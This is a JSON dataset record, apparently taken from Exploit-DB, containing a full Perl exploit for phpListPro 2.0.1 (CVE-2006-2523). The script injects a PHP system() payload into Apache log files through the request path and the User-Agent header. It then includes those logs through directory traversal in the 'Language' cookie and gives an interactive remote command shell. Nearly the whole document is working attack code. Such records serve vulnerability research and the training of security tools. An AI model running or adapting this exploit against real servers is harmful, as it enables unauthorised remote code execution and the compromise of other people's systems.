{
  "id": "1805",
  "title": "phpListPro 2.0.1 - &#039;Language&#039; Remote Code Execution",
  "cve": "CVE-2006-2523",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# Title: phpListPro <= 2.0.1 Remote Command Execution Exploit\r\n# URL: http://www.smartisoft.com/\r\n#\r\n# Info: \r\n# - arbitrary local inclusion \r\n# - need magic_quotes_gpc=off\r\n# \r\n#\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\n#ripped from rgod\r\n\r\n@apache=(\r\n  \"/var/log/httpd/access_log%00\",\r\n  \"/var/log/httpd/error_log%00\",\r\n  \"/var/log/apache/error.log%00\",\r\n  \"/var/log/apache/access.log%00\",  \r\n  \"/apache/logs/error.log%00\",\r\n  \"/apache/logs/access.log%00\",\r\n  \"/etc/httpd/logs/acces_log%00\",\r\n  \"/etc/httpd/logs/acces.log%00\",\r\n  \"/etc/httpd/logs/error_log%00\",\r\n  \"/etc/httpd/logs/error.log%00\",\r\n  \"/var/www/logs/access_log%00\",\r\n  \"/var/www/logs/access.log%00\",\r\n  \"/usr/local/apache/logs/access_log%00\",\r\n  \"/usr/local/apache/logs/access.log%00\",\r\n  \"/var/log/apache/access_log%00\",\r\n  \"/var/log/apache/access.log%00\",\r\n  \"/var/log/access_log%00\",\r\n  \"/var/www/logs/error_log%00\",\r\n  \"/www/logs/error.log%00\",\r\n  \"/usr/local/apache/logs/error_log%00\",\r\n  \"/usr/local/apache/logs/error.log%00\",\r\n  \"/var/log/apache/error_log%00\",\r\n  \"/var/log/apache/error.log%00\",\r\n  \"/var/log/access_log%00\",\r\n  \"/var/log/error_log%00\",\r\n);\r\n\r\nprint \"[i] phpListPro remote command execution exploit\\n\";\r\nprint \"[i] Need magic_quotes_gpc=off\\n\";\r\nprint \"[i] Coded by [Oo]\\n\\n\";\r\n\r\n\r\nif (@ARGV < 3)\r\n{\r\n\tprint \"[*] Usage: phplistpro_exp.pl [host] [path] [apache_path]\\n\\n\";\r\n\tprint \"[*] Apache_Path: \\n\";\r\n\t$i = 0;\r\n\twhile($apache[$i])\r\n\t{\r\n\t\tprint \"[$i] $apache[$i]\\n\";\r\n\t\t$i++;\r\n\t}\r\n\tprint \"\\n[*] Exemple: phplistpro_exp.pl 127.0.0.1 /phplistpro/ 1\\n\";\r\n\texit();\r\n}\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$type=$ARGV[2];\r\n\r\nprint \"[+] Injecting some code in log files...\\n\";\r\n#ripped from rgod\r\n$CODE=\"<?php ob_clean();system(\\$HTTP_COOKIE_VARS[cmd]);die;?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\") or die \"[-] Connecting ... Could not connect to host.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$serv.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\n\r\nprint \"[+] Ok! Now here the shell, type exit to quit\\n\";\r\nprint \"[+] If it's not work maybe try another apache_path...\\n\\n\";\r\n\r\nprint \"[shell] \";\r\n$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"exit\")\r\n{\r\n\t$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\") or die \"[-] Connecting ... Could not connect to host.\\n\\n\";\r\n\t\r\n\tprint $socket \"GET \".$path.\"config.php HTTP/1.1\\r\\n\";\r\n\tprint $socket \"Host: \".$serv.\"\\r\\n\";\r\n\tprint $socket \"Accept: */*\\r\\n\";\r\n\tprint $socket \"Cookie: Language=/../../../../../../../../../..\".$apache[$type].\";cmd=$cmd \\r\\n\";\r\n\tprint $socket \"Connection: close\\r\\n\\n\";\t\r\n\t\r\n\twhile ($answer = <$socket>)\r\n\t{\r\n\t\tprint $answer;\r\n\t}\r\n\t\r\n\tprint \"[shell] \";\r\n\t$cmd = <STDIN>;\t\r\n}\r\n\r\n# milw0rm.com [2006-05-19]",
  "url": "https://www.exploit-db.com/exploits/1805"
}